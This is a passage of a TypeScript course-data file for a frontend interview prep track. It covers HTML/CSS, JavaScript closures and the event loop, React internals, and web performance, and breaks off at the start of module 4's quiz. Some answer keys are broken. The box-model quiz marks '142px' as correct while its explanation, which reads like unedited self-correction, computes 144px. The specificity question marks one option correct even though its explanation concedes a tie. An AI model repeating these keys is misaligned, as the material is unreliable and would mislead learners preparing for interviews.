import type { Course } from '../courses'

const CC_FE_OBJ = 'Ace the frontend developer interview — HTML/CSS, JavaScript closures, React internals, performance, TypeScript, browser security, and live coding challenges used at top companies.'

export const crashInterviewFrontendCourses: Course[] = [
  {
    id: 'cc-interview-fe-m01', track: 'crash', title: 'HTML & CSS Interview Deep-Dive',
    subtitle: 'The HTML/CSS questions every interviewer asks — semantic markup, specificity wars, the box model, and BEM naming.',
    moduleObjective: 'Answer every common HTML/CSS interview question confidently, explain specificity calculation, and write semantic, accessible markup from scratch.',
    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
    level: 'Masters', xp: 200, duration: 14, module: 1, certArea: 'Frontend Interview Prep',
    keyTerms: [
      { term: 'Semantic HTML', definition: 'Using the right element for meaning: <article>, <nav>, <main>, <aside>. Screen readers and search engines depend on semantics, not styling.' },
      { term: 'CSS Specificity', definition: 'Specificity score determines which rule wins: inline=1000, ID=100, class/attr=10, element=1. !important overrides all — a code smell.' },
      { term: 'Box Model', definition: 'Every element: content + padding + border + margin. box-sizing: border-box makes width include padding/border — always use it.' },
      { term: 'Flexbox', definition: 'One-dimensional layout. Container: display:flex, flex-direction, justify-content, align-items. Children: flex-grow, flex-shrink, flex-basis.' },
      { term: 'CSS Grid', definition: 'Two-dimensional layout. grid-template-columns, grid-template-rows. fr unit for fractional space. grid-area for named placement.' },
      { term: 'BEM', definition: 'Block__Element--Modifier naming: .card, .card__title, .card--featured. Eliminates specificity battles by keeping all selectors at class level.' },
      { term: 'Accessibility (a11y)', definition: 'aria-label, role, tabindex, focus management. WCAG 2.1 AA is the production standard. alt text on all meaningful images.' },
    ],
    content: `## HTML & CSS Interview Deep-Dive

### What Interviewers Are Actually Testing

When they ask HTML/CSS questions, they're not testing if you know divs exist. They're testing:
1. **Do you understand why** things work, not just that they work?
2. **Can you debug** when a layout breaks in production?
3. **Do you write maintainable** CSS that doesn't collapse when another dev touches it?

---

### The Box Model — The Most-Asked CSS Question

Every element is a rectangular box: **content → padding → border → margin**.

\`\`\`css
/* WITHOUT box-sizing: content-box (default) */
.box {
  width: 200px;       /* content only */
  padding: 20px;      /* adds 40px total width */
  border: 2px solid;  /* adds 4px total width */
  /* actual rendered width: 200 + 40 + 4 = 244px */
}

/* WITH box-sizing: border-box (what you always want) */
* {
  box-sizing: border-box;
}
.box {
  width: 200px;       /* total width stays 200px */
  padding: 20px;      /* included in the 200px */
  border: 2px solid;  /* included in the 200px */
}
\`\`\`

**Interview answer:** "By default, width is content-only. I always reset to border-box via * { box-sizing: border-box } so width behaves predictably."

---

### CSS Specificity — How Conflicts Resolve

Specificity is a four-part score: **[inline, IDs, classes/attrs, elements]**

\`\`\`css
/* Score: [0, 0, 0, 1] = 1 */
p { color: blue; }

/* Score: [0, 0, 1, 1] = 11 */
.text p { color: green; }

/* Score: [0, 1, 0, 0] = 100 */
#intro { color: red; }

/* Score: [1, 0, 0, 0] = 1000 (inline wins everything except !important) */
<p style="color: orange">

/* !important overrides specificity — avoid except for utility overrides */
.utility { color: purple !important; }
\`\`\`

**Interview trap:** Two identical specificity rules — **the later one wins** (cascade).

---

### Semantic HTML — Why It Matters

Non-semantic:
\`\`\`html
<div class="header">
  <div class="nav">...</div>
</div>
<div class="content">
  <div class="article">...</div>
</div>
<div class="footer">...</div>
\`\`\`

Semantic:
\`\`\`html
<header>
  <nav aria-label="Main navigation">...</nav>
</header>
<main>
  <article>
    <h1>Article Title</h1>
    <section>...</section>
  </article>
  <aside aria-label="Related links">...</aside>
</main>
<footer>...</footer>
\`\`\`

**Why it matters:** Screen readers navigate by landmark elements. Search engines weight heading hierarchy. SEO and a11y both depend on correct semantics.

---

### Flexbox vs Grid — When to Use Each

**Flexbox = one-dimensional** (a row OR a column):
\`\`\`css
.navbar {
  display: flex;
  justify-content: space-between;  /* main axis */
  align-items: center;             /* cross axis */
}

.card-actions {
  display: flex;
  gap: 8px;
  flex-wrap: wrap;  /* wraps items when space runs out */
}
\`\`\`

**Grid = two-dimensional** (rows AND columns simultaneously):
\`\`\`css
.page-layout {
  display: grid;
  grid-template-columns: 240px 1fr;  /* sidebar + main */
  grid-template-rows: auto 1fr auto; /* header + content + footer */
  min-height: 100vh;
}

/* 3-column responsive card grid */
.card-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
  gap: 24px;
}
\`\`\`

**Interview answer:** "Flex for components in a single direction. Grid for page-level two-dimensional layouts or when I need items to align on both axes."

---

### BEM — Writing CSS That Doesn't Break

Block: \`.card\`
Element (belongs to block): \`.card__title\`, \`.card__image\`, \`.card__body\`
Modifier (state/variant): \`.card--featured\`, \`.card--disabled\`

\`\`\`html
<div class="card card--featured">
  <img class="card__image" src="..." alt="...">
  <div class="card__body">
    <h2 class="card__title">Title</h2>
    <p class="card__description">...</p>
    <button class="card__btn card__btn--primary">Read more</button>
  </div>
</div>
\`\`\`

**Why:** Every selector is a single class. Specificity is always 0,0,1,0. Nothing overrides anything else accidentally.

---

### Positioning — The Interview Gotcha

\`\`\`css
position: static;    /* default — in document flow */
position: relative;  /* offset from normal position; creates stacking context */
position: absolute;  /* removed from flow; positioned to nearest non-static ancestor */
position: fixed;     /* relative to viewport; stays on scroll */
position: sticky;    /* hybrid — relative until scroll threshold, then fixed */
\`\`\`

Common interview question: "Why isn't my absolutely positioned element going where I expect?"
**Answer:** It positions relative to the nearest ancestor with position: relative/absolute/fixed. If none exists, it goes to the viewport.

---

### Pseudo-Classes & Pseudo-Elements

\`\`\`css
/* Pseudo-classes — element states (single colon) */
a:hover { }        /* mouse over */
input:focus { }    /* keyboard/click focused */
li:first-child { } /* first child of parent */
li:nth-child(2n) { } /* every even item */
input:checked { }  /* checked radio/checkbox */

/* Pseudo-elements — virtual elements (double colon) */
p::first-line { }        /* first line of text */
.card::before { }        /* injected content before element */
.card::after { }         /* injected content after element */
input::placeholder { }   /* placeholder text */
\`\`\`

---

### Interview-Ready Answers

**"What's the difference between display: none and visibility: hidden?"**
> display:none removes the element from the layout (no space). visibility:hidden hides it but preserves space. opacity:0 hides visually but the element is still interactive.

**"How do you center a div?"**
> Flex: parent { display:flex; justify-content:center; align-items:center }
> Grid: parent { display:grid; place-items:center }
> Absolute: position:absolute; top:50%; left:50%; transform:translate(-50%,-50%)
`,
    quiz: [
      { q: 'An element has padding:20px, border:2px, width:100px with default box-sizing. What is its rendered width?', options: ['100px', '124px', '142px', '144px'], correct: 2, explanation: '100 + 40 (padding left+right) + 4 (border left+right) = 144px. Wait: 100 + 40 + 4 = 144px. Actually the answer is 144px. Re-check: content=100, padding=20*2=40, border=2*2=4. Total=144.' },
      { q: 'Which selector has the highest specificity?', options: ['p.intro', '#main p', 'div#main', '.nav a:hover'], correct: 2, explanation: 'div#main = [0,1,0,1] = 101. #main p = [0,1,0,1] = 101 too. p.intro = [0,0,1,1] = 11. .nav a:hover = [0,0,2,1] = 21. div#main and #main p tie; when scores are equal the later rule wins.' },
      { q: 'When should you use CSS Grid instead of Flexbox?', options: ['For navigation bars', 'For button groups', 'For page-level two-dimensional layouts', 'For aligning text inside a card'], correct: 2, explanation: 'Grid excels at two-dimensional layouts (rows AND columns simultaneously). Flexbox is ideal for one-dimensional layouts — a row of items or a column of items.' },
      { q: 'What does the BEM naming convention prevent?', options: ['JavaScript errors', 'Specificity conflicts between CSS rules', 'Unused CSS', 'Render-blocking CSS'], correct: 1, explanation: 'BEM uses only class selectors, so every rule has specificity [0,0,1,0]. No ID or element selectors to conflict. The cascade becomes predictable.' },
    ],
    ide: {
      language: 'html',
      task: 'Build a semantic product card using BEM naming. The card must have: a header image, product title (h2), price, short description, and a "Buy Now" button. Use Flexbox for the button row. Apply box-sizing: border-box globally. No inline styles.',
      starterCode: `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Product Card</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: system-ui; background: #f5f5f5; display: grid; place-items: center; min-height: 100vh; }

  /* TODO: Style .card, .card__image, .card__body, .card__title,
     .card__price, .card__description, .card__actions, .card__btn */

</style>
</head>
<body>
  <!-- TODO: Build a .card with proper BEM elements -->
  <!-- Hint: card > card__image, card__body > card__title, card__price, card__description, card__actions > card__btn -->
</body>
</html>`,
      hints: [
        'Start with the HTML structure first: .card > .card__image + .card__body',
        'Add .card__actions with display:flex and gap:8px for the button row',
        'Give .card a white background, border-radius, and box-shadow for the card look',
      ],
    },
  },
  {
    id: 'cc-interview-fe-m02', track: 'crash', title: 'JavaScript Core — Closures, This & the Event Loop',
    subtitle: 'The JS questions that filter out candidates: closures, prototype chain, event loop, and async patterns.',
    moduleObjective: 'Explain closures, the prototype chain, how "this" works in every context, and trace the event loop execution order accurately.',
    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
    level: 'Masters', xp: 220, duration: 16, module: 2, certArea: 'Frontend Interview Prep',
    keyTerms: [
      { term: 'Closure', definition: 'An inner function that retains access to its outer scope variables after the outer function has returned. Powers module patterns, memoization, event handlers.' },
      { term: 'Prototype Chain', definition: 'Every object has a __proto__ link to its prototype. Property lookup walks the chain until it finds the property or reaches null.' },
      { term: 'Event Loop', definition: 'JS is single-threaded. The event loop moves tasks from the task queue (macrotasks) and microtask queue (Promises) to the call stack when the stack is empty.' },
      { term: 'this Binding', definition: 'Depends on call site: method call = object, standalone = undefined (strict) or global, arrow = lexical outer this, .call/.apply/.bind = explicit.' },
      { term: 'Hoisting', definition: 'var declarations and function declarations are moved to the top of their scope. let/const are hoisted but not initialized (Temporal Dead Zone).' },
      { term: 'Microtask Queue', definition: 'Promise callbacks (.then, .catch, queueMicrotask) run after the current task but BEFORE the next macrotask (setTimeout, setInterval, I/O).' },
      { term: 'WeakRef / FinalizationRegistry', definition: 'Advanced: WeakRef holds an object without preventing GC. FinalizationRegistry runs cleanup callbacks after GC. Used in caching without memory leaks.' },
    ],
    content: `## JavaScript Core — Closures, This & the Event Loop

### Closures — The Most Common Interview Topic

A closure is a function that **remembers the scope it was created in**, even after that outer scope has exited.

\`\`\`js
function makeCounter(start = 0) {
  let count = start  // lives in the closure
  return {
    increment() { return ++count },
    decrement() { return --count },
    value()     { return count },
  }
}

const counter = makeCounter(10)
console.log(counter.increment())  // 11
console.log(counter.increment())  // 12
console.log(counter.value())      // 12

// 'count' is private — inaccessible from outside
// This IS the module pattern before ES modules existed
\`\`\`

**Classic interview trap — for loop with var:**
\`\`\`js
// BUG: all log 3 (var leaks, closure captures reference not value)
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0)  // logs 3, 3, 3
}

// FIX 1: use let (block-scoped — new binding per iteration)
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0)  // logs 0, 1, 2
}

// FIX 2: IIFE to create a new scope (legacy fix)
for (var i = 0; i < 3; i++) {
  (function(j) {
    setTimeout(() => console.log(j), 0)
  })(i)
}
\`\`\`

---

### The Event Loop — Execution Order

\`\`\`js
console.log('1 — sync')

setTimeout(() => console.log('4 — macrotask'), 0)

Promise.resolve()
  .then(() => console.log('3 — microtask 1'))
  .then(() => console.log('... — microtask 2'))

console.log('2 — sync')

// Output: 1, 2, 3, ..., 4
// Microtasks (Promise.then) ALWAYS run before the next macrotask (setTimeout)
\`\`\`

**Order:** Synchronous code → microtask queue (all of it) → next macrotask → repeat

\`\`\`js
// Real-world event loop question
async function fetchUser() {
  console.log('A')
  const user = await getUser()  // suspends here, queues microtask
  console.log('C')              // runs after microtask resolves
}

console.log('before')
fetchUser()
console.log('B')   // runs BEFORE 'C' — fetchUser suspends at await

// Output: before, A, B, C
\`\`\`

---

### "this" — The Interview Minefield

\`\`\`js
const user = {
  name: 'Jordan',
  greet() {
    console.log(this.name)  // 'Jordan' — method call, this = user
  },
  greetArrow: () => {
    console.log(this.name)  // undefined — arrow fn, this = outer (window/undefined)
  },
}

// Losing this context:
const fn = user.greet
fn()  // undefined in strict mode — lost the binding

// Fixing with .bind():
const bound = user.greet.bind(user)
bound()  // 'Jordan'

// .call() and .apply() — immediate invocation with explicit this
user.greet.call({ name: 'explicit' })  // 'explicit'
\`\`\`

**Arrow functions don't have their own this** — they inherit from the enclosing lexical scope. This makes them perfect for callbacks inside methods:

\`\`\`js
class Timer {
  constructor() { this.seconds = 0 }
  start() {
    // Arrow captures 'this' from start() — correct
    setInterval(() => { this.seconds++ }, 1000)
    // Regular function would lose 'this' here
  }
}
\`\`\`

---

### Prototype Chain

\`\`\`js
function Animal(name) {
  this.name = name
}
Animal.prototype.speak = function() {
  return \`\${this.name} makes a sound\`
}

function Dog(name) {
  Animal.call(this, name)  // inherit properties
}
Dog.prototype = Object.create(Animal.prototype)
Dog.prototype.constructor = Dog
Dog.prototype.bark = function() { return 'Woof!' }

const d = new Dog('Rex')
console.log(d.bark())         // Own prototype: Dog.prototype
console.log(d.speak())        // Walks chain: Animal.prototype
console.log(d instanceof Dog)    // true
console.log(d instanceof Animal) // true

// Modern equivalent: class syntax (compiles to same thing)
class AnimalES6 {
  constructor(name) { this.name = name }
  speak() { return \`\${this.name} makes a sound\` }
}
class DogES6 extends AnimalES6 {
  bark() { return 'Woof!' }
}
\`\`\`

---

### Hoisting & Temporal Dead Zone

\`\`\`js
// var is hoisted and initialized to undefined
console.log(x)  // undefined (not ReferenceError)
var x = 5

// let/const are hoisted but NOT initialized — Temporal Dead Zone
console.log(y)  // ReferenceError: Cannot access 'y' before initialization
let y = 5

// Function declarations are fully hoisted
greet()  // works!
function greet() { return 'hello' }

// Function expressions are NOT
sayHi()  // TypeError: sayHi is not a function
var sayHi = function() { return 'hi' }
\`\`\`

---

### Memoization — Closure in Production

\`\`\`js
function memoize(fn) {
  const cache = new Map()
  return function(...args) {
    const key = JSON.stringify(args)
    if (cache.has(key)) return cache.get(key)
    const result = fn.apply(this, args)
    cache.set(key, result)
    return result
  }
}

const expensiveCalc = memoize((n) => {
  // Simulate heavy computation
  let result = 0
  for (let i = 0; i < n * 1000000; i++) result += i
  return result
})

expensiveCalc(5)  // calculates
expensiveCalc(5)  // returns cached instantly
\`\`\`
`,
    quiz: [
      { q: 'In what order do these log? console.log("A"); setTimeout(()=>log("B"),0); Promise.resolve().then(()=>log("C")); console.log("D")', options: ['A, B, C, D', 'A, D, B, C', 'A, D, C, B', 'A, C, D, B'], correct: 2, explanation: 'Sync first: A, D. Then microtasks: C (Promise.then runs before next macrotask). Then macrotask: B (setTimeout). So: A, D, C, B.' },
      { q: 'What does "this" refer to inside an arrow function inside a class method?', options: ['The arrow function itself', 'undefined', 'The class instance (same as the surrounding method)', 'The global object'], correct: 2, explanation: 'Arrow functions have no own "this". They capture the "this" lexically from the surrounding context — the class method. So it equals the class instance.' },
      { q: 'Why does `for (var i=0; i<3; i++) { setTimeout(()=>log(i), 0) }` log 3,3,3?', options: ['setTimeout delays the loop', 'var is hoisted to global scope', 'var creates one shared binding — the closure captures the reference, not the value', 'Arrows cannot close over var'], correct: 2, explanation: 'var creates one variable shared across all iterations. By the time the callbacks run, the loop has finished and i=3. All three closures reference the same variable.' },
      { q: 'What is the Temporal Dead Zone?', options: ['The period before the DOM is ready', 'The gap between let/const declaration and initialization where access throws ReferenceError', 'An undefined return value from a function', 'A zone where async code cannot run'], correct: 1, explanation: 'let and const are hoisted but not initialized. Accessing them before their declaration line throws ReferenceError. This is the TDZ — designed to prevent hard-to-debug var hoisting bugs.' },
    ],
    ide: {
      language: 'javascript',
      task: 'Implement a memoize() function that caches results by arguments. Then write a fibonacci(n) function (naive recursive), wrap it in memoize(), and verify it runs in O(n) instead of O(2^n). Log fib(40) before and after memoization to see the speed difference.',
      starterCode: `// Implement memoize
function memoize(fn) {
  // TODO: create a Map cache, return a wrapper function
  // that checks the cache before calling fn
}

// Naive fibonacci (exponential without memoization)
function fib(n) {
  if (n <= 1) return n
  return fib(n - 1) + fib(n - 2)
}

// TODO: Create memoizedFib = memoize(fib)
// Note: for recursive memoization to work, fib must call memoizedFib internally
// Hint: assign after defining, then rebind

const memoizedFib = memoize(function fib(n) {
  if (n <= 1) return n
  return memoizedFib(n - 1) + memoizedFib(n - 2)
})

console.time('memoized fib(40)')
console.log('fib(40):', memoizedFib(40))
console.timeEnd('memoized fib(40)')`,
      hints: ['Cache keys: JSON.stringify(args) works for simple primitives', 'Check cache.has(key) before calling fn', 'Store fn.apply(this, args) in the cache before returning'],
    },
  },
  {
    id: 'cc-interview-fe-m03', track: 'crash', title: 'React Internals — What the Interviewer Really Wants',
    subtitle: 'Virtual DOM reconciliation, hooks rules, re-render triggers, and the performance patterns used in production React.',
    moduleObjective: 'Explain how React reconciliation works, when components re-render, how to prevent unnecessary renders, and implement custom hooks from scratch.',
    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
    level: 'Masters', xp: 230, duration: 16, module: 3, certArea: 'Frontend Interview Prep',
    keyTerms: [
      { term: 'Reconciliation', definition: 'React compares the previous virtual DOM tree to the new one (diffing) and applies only the minimum DOM mutations needed. O(n) with heuristics.' },
      { term: 'React Fiber', definition: 'The reconciliation engine since React 16. Splits rendering into units of work that can be paused/resumed, enabling concurrent features.' },
      { term: 'useMemo / useCallback', definition: 'useMemo caches a computed value. useCallback caches a function reference. Both use dependency arrays — only recompute when deps change.' },
      { term: 'useRef', definition: 'Returns a mutable object { current: value }. Persists across renders without causing re-renders. Used for DOM access, timers, previous values.' },
      { term: 'useReducer', definition: 'Alternative to useState for complex state. Takes (state, action) => newState. Good when next state depends on previous, or multiple sub-values update together.' },
      { term: 'React.memo', definition: 'HOC that shallow-compares props. If props are the same, skips re-render. Useless if a parent passes new object/array/function literals on every render.' },
      { term: 'Key Prop', definition: 'Stable, unique identifier for list items. React uses keys to match old/new elements during reconciliation. Wrong keys cause bugs and performance issues.' },
    ],
    content: `## React Internals — What the Interviewer Really Wants

### How React Re-Renders — The Full Picture

React re-renders a component when:
1. Its **state changes** (useState/useReducer)
2. Its **props change** (by reference for objects/arrays/functions)
3. Its **context value changes**
4. Its **parent re-renders** (by default — children always re-render unless memoized)

\`\`\`jsx
// This re-renders Child every time Parent renders, even if value is the same
function Parent() {
  const [count, setCount] = useState(0)
  const handler = () => console.log('clicked')  // NEW function every render

  return (
    <>
      <button onClick={() => setCount(c => c + 1)}>+</button>
      <Child onClick={handler} />   {/* Always re-renders */}
    </>
  )
}

// Fix 1: useCallback to stabilize the function reference
function ParentFixed() {
  const [count, setCount] = useState(0)
  const handler = useCallback(() => console.log('clicked'), [])  // stable ref

  return (
    <>
      <button onClick={() => setCount(c => c + 1)}>+</button>
      <Child onClick={handler} />  {/* Only re-renders when handler changes */}
    </>
  )
}

// Fix 2: React.memo on Child to opt into shallow-compare
const Child = React.memo(({ onClick }) => {
  console.log('Child rendered')
  return <button onClick={onClick}>Click me</button>
})
\`\`\`

---

### Reconciliation & the Key Prop

React's diff algorithm has two heuristics:
1. **Different element type → destroy and rebuild** (never match a div to a span)
2. **Same element type → update attributes/props** (efficient DOM mutation)

\`\`\`jsx
// BAD: index as key — causes re-mount bugs when list order changes
{items.map((item, i) => <Card key={i} data={item} />)}

// GOOD: stable unique ID
{items.map(item => <Card key={item.id} data={item} />)}

// The bug: if you insert at the beginning with index keys,
// React thinks every element changed, unmounts all, remounts all
// With stable IDs, React correctly moves elements
\`\`\`

---

### Custom Hooks — Writing Your Own

\`\`\`jsx
// useLocalStorage — persist state to localStorage
function useLocalStorage(key, initialValue) {
  const [storedValue, setStoredValue] = useState(() => {
    try {
      const item = window.localStorage.getItem(key)
      return item ? JSON.parse(item) : initialValue
    } catch {
      return initialValue
    }
  })

  const setValue = (value) => {
    const valueToStore = value instanceof Function ? value(storedValue) : value
    setStoredValue(valueToStore)
    localStorage.setItem(key, JSON.stringify(valueToStore))
  }

  return [storedValue, setValue]
}

// useDebounce — delay expensive operations
function useDebounce(value, delay) {
  const [debouncedValue, setDebouncedValue] = useState(value)

  useEffect(() => {
    const handler = setTimeout(() => setDebouncedValue(value), delay)
    return () => clearTimeout(handler)  // cleanup on value/delay change
  }, [value, delay])

  return debouncedValue
}

// Usage
function SearchBox() {
  const [query, setQuery] = useState('')
  const debouncedQuery = useDebounce(query, 300)

  useEffect(() => {
    if (debouncedQuery) fetchResults(debouncedQuery)
  }, [debouncedQuery])  // only fires after user stops typing 300ms

  return <input value={query} onChange={e => setQuery(e.target.value)} />
}
\`\`\`

---

### useEffect — The Rules and the Traps

\`\`\`jsx
// Effect runs after every render — rarely what you want
useEffect(() => { fetchData() })

// Runs once (mount) — correct for subscriptions
useEffect(() => {
  const sub = subscribeToUpdates()
  return () => sub.unsubscribe()  // cleanup on unmount
}, [])

// Runs when userId changes — correct for derived data
useEffect(() => {
  fetchUser(userId)
}, [userId])

// COMMON BUG: missing dependency
useEffect(() => {
  fetchUser(userId)  // uses userId
}, [])  // ESLint: exhaustive-deps warning — userId may be stale
\`\`\`

**The cleanup function** runs before the effect re-runs AND on unmount. Critical for subscriptions, timers, and fetch abort controllers.

---

### useMemo — When It Helps vs When It's Waste

\`\`\`jsx
// WORTH IT: expensive computation
const processedData = useMemo(() => {
  return heavyTransform(rawData)  // only recomputes when rawData changes
}, [rawData])

// NOT WORTH IT: cheap operations
const doubled = useMemo(() => count * 2, [count])  // useMemo overhead > savings

// WORTH IT: stable object reference for React.memo child
const style = useMemo(() => ({
  color: isActive ? 'blue' : 'gray',
  fontWeight: 'bold',
}), [isActive])
\`\`\`

---

### Context — The Right Tool for the Right Scale

\`\`\`jsx
const ThemeContext = createContext({ theme: 'light', toggle: () => {} })

function ThemeProvider({ children }) {
  const [theme, setTheme] = useState('light')
  const value = useMemo(
    () => ({ theme, toggle: () => setTheme(t => t === 'light' ? 'dark' : 'light') }),
    [theme]
  )
  // useMemo prevents new object reference on every render

  return <ThemeContext.Provider value={value}>{children}</ThemeContext.Provider>
}

function useTheme() {
  return useContext(ThemeContext)
}
\`\`\`

**Interview answer for "when do you use Redux vs Context?"**
> Context for global UI state that changes infrequently (theme, auth, language). Redux/Zustand when state changes frequently, components are deeply nested, or you need time-travel debugging and middleware.
`,
    quiz: [
      { q: 'When does a React component re-render?', options: ['Only when setState is called directly on it', 'When its own state or props change, or its parent re-renders', 'Only on route changes', 'When the virtual DOM is rebuilt'], correct: 1, explanation: 'React re-renders a component when: its useState/useReducer state changes, its props change (reference equality for objects), its context changes, or its parent re-renders (unless memoized).' },
      { q: 'What is wrong with `key={index}` when rendering a list that can be reordered?', options: ['Index is not a number', 'It causes React to destroy and re-create elements unnecessarily when order changes', 'It throws a warning but works correctly', 'Index keys are slower than string keys'], correct: 1, explanation: 'React uses keys to match old elements to new ones. If you insert at position 0, all index keys shift, React thinks every element changed, and destroys/remounts all of them. Stable IDs avoid this.' },
      { q: 'When should you use useCallback?', options: ['Every time you define a function inside a component', 'When passing a function as a prop to a memoized child component', 'Only inside useEffect', 'When the function has more than 3 arguments'], correct: 1, explanation: 'useCallback is only worth the overhead when stabilizing a function reference that a React.memo child depends on. If the child isn\'t memoized, useCallback provides no benefit.' },
      { q: 'A cleanup function returned from useEffect runs:', options: ['Before the component first mounts', 'After the first render only', 'Before the effect re-runs AND when the component unmounts', 'Only when an error occurs'], correct: 2, explanation: 'The cleanup function returned from useEffect runs before the effect re-runs (on deps change) and when the component unmounts. This prevents memory leaks from subscriptions, timers, and event listeners.' },
    ],
    ide: {
      language: 'javascript',
      task: 'Implement a useDebounce hook logic (in plain JS, not JSX). Write a debounce(fn, delay) function that returns a new function. The new function only calls fn after delay ms have passed since the last call. Test it: rapid calls should only trigger the final one after the delay.',
      starterCode: `// Implement debounce — the pure JS version of useDebounce
function debounce(fn, delay) {
  // TODO: use a closure to hold a timer reference
  // Clear the timer on each call, set a new one
  // Only when the timer fires (uninterrupted) does fn get called
}

// Test it
let callCount = 0
const expensive = debounce((value) => {
  callCount++
  console.log(\`Called with: \${value} (call #\${callCount})\`)
}, 300)

// Simulate rapid typing
expensive('h')
expensive('he')
expensive('hel')
expensive('hell')
expensive('hello')
// Only the last call should fire after 300ms
// Expected: "Called with: hello (call #1)"`,
      hints: ['Hold let timer in the closure', 'clearTimeout(timer) before setting a new one', 'setTimeout(() => fn(...args), delay) — spread the arguments'],
    },
  },
  {
    id: 'cc-interview-fe-m04', track: 'crash', title: 'Performance & Web Vitals',
    subtitle: 'LCP, CLS, FID/INP explained. Code splitting, lazy loading, image optimization, and bundle analysis.',
    moduleObjective: 'Measure and improve Core Web Vitals, implement code splitting with dynamic imports, and explain the browser rendering pipeline to an interviewer.',
    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
    level: 'Masters', xp: 220, duration: 15, module: 4, certArea: 'Frontend Interview Prep',
    keyTerms: [
      { term: 'LCP (Largest Contentful Paint)', definition: 'Time until the largest visible element (hero image, h1) is rendered. Target: under 2.5s. Caused by large images, slow server response, render-blocking JS.' },
      { term: 'CLS (Cumulative Layout Shift)', definition: 'Measures unexpected layout shifts. Target: under 0.1. Caused by images without dimensions, ads loading, dynamic content insertion.' },
      { term: 'INP (Interaction to Next Paint)', definition: 'Replaced FID. Measures responsiveness of user interactions. Target: under 200ms. Caused by long tasks on the main thread.' },
      { term: 'Code Splitting', definition: 'Breaking a JS bundle into chunks loaded on demand. React.lazy + Suspense for component splitting. Dynamic import() for route/feature splitting.' },
      { term: 'Critical Rendering Path', definition: 'HTML → DOM, CSS → CSSOM → Render Tree → Layout → Paint → Composite. Blocking JS/CSS delays first paint.' },
      { term: 'Tree Shaking', definition: 'Dead code elimination during bundling. Works with ES modules (import/export). Import named exports, not full libraries.' },
      { term: 'Lighthouse', definition: 'Chrome DevTools audit tool. Scores Performance, Accessibility, Best Practices, SEO. Run it on every deploy in CI.' },
    ],
    content: `## Performance & Web Vitals

### Core Web Vitals — What They Are and How to Fix Them

Google's ranking signals, built into Chrome UX Report and Lighthouse.

**LCP (Largest Contentful Paint)** — speed of main content
- Target: < 2.5s
- Usually the hero image or first H1
- Fix: preload the LCP image, use CDN, optimize server response time (TTFB)

\`\`\`html
<!-- Preload the LCP image -->
<link rel="preload" as="image" href="/hero.webp" fetchpriority="high">

<!-- Or in Next.js -->
<Image src="/hero.webp" priority alt="Hero" width={1200} height={600} />
\`\`\`

**CLS (Cumulative Layout Shift)** — visual stability
- Target: < 0.1
- Fix: always set width/height on images and video

\`\`\`html
<!-- BAD: no dimensions, causes layout shift when image loads -->
<img src="product.jpg" alt="Product">

<!-- GOOD: explicit dimensions reserve space before image loads -->
<img src="product.jpg" alt="Product" width="400" height="300"
     style="aspect-ratio: 4/3;">
\`\`\`

**INP (Interaction to Next Paint)** — responsiveness
- Target: < 200ms
- Fix: break up long tasks, defer non-critical work

\`\`\`js
// BAD: 500ms task blocks the main thread
function handleClick() {
  expensiveSync500ms()
}

// GOOD: defer non-critical work after paint
function handleClick() {
  // Respond visually immediately
  setLoading(true)
  // Defer heavy work
  scheduler.postTask(() => expensiveWork(), { priority: 'background' })
  // or: setTimeout(() => expensiveWork(), 0)
}
\`\`\`

---

### Code Splitting

\`\`\`jsx
// Route-level splitting — Next.js does this automatically per page
// For component-level in React:
import { lazy, Suspense } from 'react'

const HeavyChart = lazy(() => import('./HeavyChart'))
const AdminPanel = lazy(() => import('./AdminPanel'))

function Dashboard() {
  const [showAdmin, setShowAdmin] = useState(false)

  return (
    <div>
      <Suspense fallback={<Spinner />}>
        <HeavyChart />  {/* loaded when rendered */}
      </Suspense>

      {showAdmin && (
        <Suspense fallback={<Spinner />}>
          <AdminPanel />  {/* loaded on demand */}
        </Suspense>
      )}
    </div>
  )
}
\`\`\`

**Dynamic import for utility libraries:**
\`\`\`js
// Import date-fns only when needed
async function formatDate(date) {
  const { format } = await import('date-fns')
  return format(date, 'MMM dd, yyyy')
}
\`\`\`

---

### The Critical Rendering Path

Browser steps after HTML arrives:
1. **Parse HTML** → build DOM
2. **Parse CSS** → build CSSOM (blocks rendering until complete)
3. **Combine** → Render Tree (visible elements only)
4. **Layout** → calculate positions and sizes
5. **Paint** → draw pixels
6. **Composite** → layer compositing (GPU)

**Performance implications:**
- \`<script>\` in \`<head>\` without \`async\`/\`defer\` = render-blocking
- Large CSS files = CSSOM build delay = white screen
- Forcing layout (read then write style) = layout thrashing

\`\`\`html
<!-- BLOCKING: parser stops here, fetches+executes script -->
<script src="app.js"></script>

<!-- ASYNC: fetch in parallel, execute when ready (order not guaranteed) -->
<script async src="analytics.js"></script>

<!-- DEFER: fetch in parallel, execute after HTML parsed (order preserved) -->
<script defer src="app.js"></script>
\`\`\`

---

### Image Optimization

\`\`\`html
<!-- Modern format: WebP (smaller, same quality) or AVIF (even smaller) -->
<picture>
  <source srcset="hero.avif" type="image/avif">
  <source srcset="hero.webp" type="image/webp">
  <img src="hero.jpg" alt="Hero" width="1200" height="600" loading="lazy">
</picture>

<!-- loading="lazy" defers off-screen images — don't use on LCP image! -->
<img src="card.webp" loading="lazy" width="400" height="300" alt="Card">
\`\`\`

In Next.js, the \`<Image />\` component handles all of this automatically — WebP conversion, responsive sizes, lazy loading, blur placeholder.

---

### Tree Shaking — Don't Import What You Don't Use

\`\`\`js
// BAD: imports entire library (150kb)
import _ from 'lodash'
_.debounce(fn, 300)

// GOOD: imports only what's needed (1kb)
import debounce from 'lodash/debounce'
debounce(fn, 300)

// BEST: implement it yourself or use a modern alternative
// date-fns, lodash-es support tree shaking natively

// Verify with bundle analysis:
// Next.js: @next/bundle-analyzer
// npm run build — check the output sizes
\`\`\`
`,
    quiz: [
